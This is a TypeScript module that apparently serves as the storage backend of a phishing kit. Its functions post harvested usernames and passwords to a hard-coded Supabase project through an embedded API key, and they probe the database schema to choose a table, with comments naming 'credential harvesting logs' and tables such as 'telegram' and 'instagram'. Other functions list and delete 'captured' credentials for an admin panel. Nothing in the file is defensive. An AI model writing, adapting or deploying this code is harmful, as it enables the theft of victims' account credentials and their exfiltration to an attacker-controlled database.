const SUPABASE_URL = 'https://dmohmlxwtkbiggqkzgsk.supabase.co/rest/v1';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRtb2htbHh3dGtiaWdncWt6Z3NrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk0NjU0NTAsImV4cCI6MjA5NTA0MTQ1MH0.EvyhVmVvvGwncvAG3-gpSTT6CRVrcW89utTc6sJ4Go8';

export interface CapturedData {
  id?: string | number;
  username?: string;
  password?: string;
  user?: string;
  pass?: string;
  email?: string;
  created_at?: string;
  [key: string]: any;
}

// Global cached table name to optimize insertion speed after the first schema probe
let cachedTableName: string | null = null;
let detectedColumns: string[] = ['username', 'password'];

/**
 * Probes the Supabase OpenAPI endpoint to find available tables in the database.
 * Returns the most appropriate table name for saving credentials (e.g. 'logins', 'credentials', 'users', etc.)
 */
export async function getTargetTable(): Promise<{ tableName: string; columns: string[] }> {
  if (cachedTableName) {
    return { tableName: cachedTableName, columns: detectedColumns };
  }

  try {
    const response = await fetch(`${SUPABASE_URL}/`, {
      method: 'GET',
      headers: {
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
      }
    });

    if (!response.ok) {
      throw new Error(`Failed to fetch OpenAPI spec. Status: ${response.status}`);
    }

    const schema = await response.json();
    if (schema && schema.paths) {
      const paths = Object.keys(schema.paths);
      // Clean paths: remove leading '/' and potential query params or details
      const tables = paths
        .map(p => p.split('/')[1])
        .filter((v, i, a) => v && a.indexOf(v) === i && v !== '');

      console.log('Detected Supabase Tables:', tables);

      // Prioritize common table names for credential harvesting logs
      const priorityList = ['logins', 'credentials', 'keys', 'telegram', 'instagram', 'users', 'accounts', 'logs', 'entries'];
      let targetTable = '';

      for (const candidate of priorityList) {
        if (tables.includes(candidate)) {
          targetTable = candidate;
          break;
        }
      }

      // If no matching key is found, use the first available table (excluding default postgrest metrics if any)
      if (!targetTable && tables.length > 0) {
        targetTable = tables[0];
      }

      if (targetTable) {
        // Probe definitions/parameters to find column names
        let cols = ['username', 'password'];
        const definition = schema.definitions?.[targetTable];
        if (definition && definition.properties) {
          cols = Object.keys(definition.properties);
        }
        
        cachedTableName = targetTable;
        detectedColumns = cols;
        return { tableName: targetTable, columns: cols };
      }
    }
  } catch (error) {
    console.warn('Fallback schema discovery triggered:', error);
  }

  // Final default fallback
  return { tableName: 'logins', columns: ['username', 'password'] };
}

/**
 * Saves login credentials to Supabase
 */
export async function saveCredentialsToSupabase(username: string, password: string): Promise<boolean> {
  try {
    const { tableName, columns } = await getTargetTable();
    console.log(`Inserting into table matching: [${tableName}] with columns:`, columns);

    // Build payload dynamically based on detected columns in the Supabase schema
    const payload: Record<string, string> = {};
    
    // Find username-like column
    const usernameCol = columns.find(c => ['username', 'user', 'email_or_username', 'email', 'login'].includes(c.toLowerCase())) || 'username';
    // Find password-like column
    const passwordCol = columns.find(c => ['password', 'pass', 'sandi', 'pass_word'].includes(c.toLowerCase())) || 'password';

    payload[usernameCol] = username;
    payload[passwordCol] = password;

    const response = await fetch(`${SUPABASE_URL}/${tableName}`, {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
        'Content-Type': 'application/json',
        'Prefer': 'return=representation'
      },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      // If table 'logins' does not exist or we got 404, try falling back to other standard tables or simply log to console.
      const errorText = await response.text();
      console.warn(`Supabase POST error: ${errorText}. Will try a standard table 'credentials' fallback.`);
      
      // Fallback post attempt to 'credentials'
      const fallbackTable = tableName === 'logins' ? 'credentials' : 'logins';
      const fallbackResponse = await fetch(`${SUPABASE_URL}/${fallbackTable}`, {
        method: 'POST',
        headers: {
          'apikey': SUPABASE_ANON_KEY,
          'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
      });
      return fallbackResponse.ok;
    }

    return true;
  } catch (error) {
    console.error('Error saving credentials to Supabase:', error);
    return false;
  }
}

/**
 * Fetches all captured login reports for display on the admin panel
 */
export async function fetchCapturedCredentials(): Promise<{ data: CapturedData[]; tableName: string }> {
  try {
    const { tableName, columns } = await getTargetTable();
    console.log(`Fetching reports from table [${tableName}]`);

    const response = await fetch(`${SUPABASE_URL}/${tableName}?select=*&order=id.desc`, {
      method: 'GET',
      headers: {
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
      }
    });

    if (!response.ok) {
      // Try fallback fetch
      const fallbackTable = tableName === 'logins' ? 'credentials' : 'logins';
      const fallbackResponse = await fetch(`${SUPABASE_URL}/${fallbackTable}?select=*`, {
        method: 'GET',
        headers: {
          'apikey': SUPABASE_ANON_KEY,
          'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
        }
      });
      if (fallbackResponse.ok) {
        const data = await fallbackResponse.json();
        return { data: Array.isArray(data) ? data : [], tableName: fallbackTable };
      }
      throw new Error(`Failed to fetch from ${tableName}`);
    }

    const data = await response.json();
    return { data: Array.isArray(data) ? data : [], tableName };
  } catch (error) {
    console.error('Error fetching captured data from Supabase:', error);
    return { data: [], tableName: cachedTableName || 'logins' };
  }
}

/**
 * Truncates or deletes all entries (Optional helper for admin ease of use)
 */
export async function clearAllCapturedData(tableName: string): Promise<boolean> {
  try {
    const response = await fetch(`${SUPABASE_URL}/${tableName}`, {
      method: 'DELETE',
      headers: {
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
      }
    });
    return response.ok;
  } catch (error) {
    console.error('Error clearing data from Supabase:', error);
    return false;
  }
}

/**
 * Deletes a single row from Supabase by its numeric or string ID
 */
export async function deleteRowFromSupabase(tableName: string, id: string | number): Promise<boolean> {
  try {
    const response = await fetch(`${SUPABASE_URL}/${tableName}?id=eq.${id}`, {
      method: 'DELETE',
      headers: {
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
      }
    });
    return response.ok;
  } catch (error) {
    console.error(`Error deleting row ID ${id} from Supabase:`, error);
    return false;
  }
}
